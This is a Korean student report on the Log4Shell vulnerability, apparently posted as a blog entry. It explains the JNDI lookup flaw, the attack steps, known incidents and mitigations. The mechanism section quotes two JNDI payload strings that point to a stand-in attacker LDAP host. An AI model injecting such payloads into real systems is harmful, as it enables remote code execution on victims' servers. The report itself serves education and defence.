@@ -1,0 +1,54 @@
+---
+layout: post
+title:  LOG4shell 보고서서
+date:   2025-03-24
+category: Design
+image: assets/img/5_28_work/log4shell.jpg
+author: Ryan Adlard
+tags: code
+---
+
+사이버 보안과 2학년 2420110205 이태강 
+1.	Log4Shell이란?
+Apache Log4j라는 Java 기반 로깅 라이브러리에서 발견된 원격 코드 실행(RCE) 취약점
+1.	높은 위험도: CVSS 점수 10점(최고 점수)을 받았으며, 광범위한 영향으로 인해 매우 위험합니다.
+2.	영향받는 버전: Apache Log4j 2.0-beta9부터 2.14.1 사이의 버전이 취약합니다
+2. 취약점의 원리
+Log4Shell은 JNDI(Java Naming and Directory Interface) Lookup 기능의 취약점을 악용합니다:
+1.	JNDI Lookup의 동작: Log4j는 로그 메시지 내 특정 문자열(예: ${jndi:ldap://attacker.com/a})을 처리할 때 JNDI를 호출하여 외부 서버와 통신합니다.
+2.	검증 부족: JNDI 호출 시 외부 디렉토리 서비스(LDAP, RMI 등)에서 데이터를 불러오는데, 이 과정에서 입력값 검증이 제대로 이루어지지 않았습니다.
+3.	악성 코드 실행: 공격자는 악성 페이로드를 포함한 URL을 삽입하여 Log4j가 이를 처리하도록 유도하고, 서버가 공격자의 LDAP 서버에서 악성 클래스를 다운로드 및 실행하게 만듭니다.
+
+3. 공격 과정
+
+1.	악성 문자열 삽입:
+공격자는 로그 메시지에 ${jndi:ldap://malicious-server}와 같은 악성 문자열을 삽입합니다. 이 문자열은 Log4j가 JNDI(Java Naming and Directory Interface) 호출로 처리하도록 설계되었습니다.
+2.	JNDI Lookup 수행:
+Log4j는 로그 메시지를 처리할 때 JNDI Lookup 기능을 통해 외부 서버(예: ldap://malicious-server)와 통신합니다. 이때, 입력값에 대한 검증이 이루어지지 않아 공격자의 서버로 연결됩니다.
+3.	악성 Java 클래스 반환:
+공격자의 LDAP 서버는 악성 Java 클래스 파일을 반환합니다. 이 파일은 공격자가 미리 설계한 페이로드를 포함하고 있습니다.
+4.	피해 서버에서 실행:
+피해 서버는 반환된 Java 클래스를 역직렬화하거나 실행합니다. 이로 인해 공격자는 피해 서버에서 임의의 코드를 실행하거나 시스템을 제어할 수 있게 됩니다
+
+  
+4. 피해 사례
+   Log4Shell은 전 세계적으로 광범위한 영향을 미쳤으며, 다음과 같은 주요 사례가 보고되었습니다:
+•	Minecraft: 게임 내 채팅창에 악성 문자열을 입력해 서버를 장악하는 방식으로 Khonsari 랜섬웨어가 유포되었습니다.
+•	대형 기업: Twitter, Cisco, VMware 등 여러 글로벌 기업이 영향을 받았으며, 해커들은 크립토마이닝, 파일리스 멀웨어 등을 배포했습니다.
+•	국가 차원의 공격: 중국, 이란, 북한 등과 관련된 해커들이 이 취약점을 악용한 것으로 나타났습니다.
+5. 방어 방법
+   Log4Shell 취약점을 방어하기 위해 다음과 같은 조치가 권장됩니다:
+
+1.	Log4j 업데이트:
+Apache에서 제공한 패치 버전(2.15.0 이상)으로 즉시 업데이트합니다.
+최신 버전(2.17.x)을 사용하는 것이 가장 안전합니다.
+
+2.	JNDI Lookup 비활성화:
+log4j2.formatMsgNoLookups=true 옵션을 설정하거나, %m을 %m{nolookups}로 변경하여 JNDI 호출을 차단합니다.
+
+3.	네트워크 보안 강화:
+IDS/IPS(침입 탐지/방지 시스템)를 사용해 의심스러운 트래픽을 차단합니다.
+방화벽 규칙을 설정해 외부 LDAP/RMI 요청을 제한합니다.
+
+4.	대체 라이브러리 사용:
+Logback 등 다른 로깅 라이브러리로 교체
